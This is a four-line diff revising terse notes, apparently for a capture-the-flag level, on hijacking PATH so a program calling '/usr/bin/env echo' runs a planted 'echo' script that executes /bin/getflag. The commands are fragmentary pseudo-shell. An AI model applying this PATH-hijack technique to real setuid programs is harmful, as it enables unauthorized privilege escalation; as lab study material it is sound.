@@ -1,4 +1,4 @@
-strings | /usr/bin/env echo Exploit me
-echo '/bin/getflag/' > echo
-PATH += /tmp
-chmod 777 
+strings -> /usr/bin/env echo Exploit me
+echo '/bin/getflag' > echo
+chmod 777 it
+export PATH=/tmp:$PATH
